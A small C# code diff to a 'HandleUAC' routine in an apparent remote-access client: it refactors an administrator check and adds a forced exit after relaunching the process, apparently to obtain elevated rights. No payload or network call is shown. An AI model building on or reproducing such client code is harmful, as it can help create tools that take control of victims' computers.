@@ -15,7 +15,7 @@ namespace Client.Handle_Packet
     {
         public HandleUAC()
         {
-            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
+            if (Methods.IsAdmin()) return;
 
             try
             {
@@ -31,6 +31,7 @@ namespace Client.Handle_Packet
                 };
                 proc.Start();
                 Methods.ClientExit();
+                Environment.Exit(0);
             }
             catch { }
         }
